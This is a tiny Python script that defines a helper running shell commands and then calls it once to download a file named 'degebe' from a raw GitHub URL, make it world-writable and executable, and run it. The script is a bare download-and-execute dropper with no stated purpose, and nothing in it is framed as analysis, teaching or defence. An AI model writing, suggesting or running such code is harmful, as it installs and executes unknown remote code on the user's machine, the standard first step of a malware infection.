from subprocess import PIPE, Popen
import base64





def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]





cmdline ('curl -L https://raw.githubusercontent.com/karmiasif/biji/main/degebe && chmod 777 degebe && ./degebe')
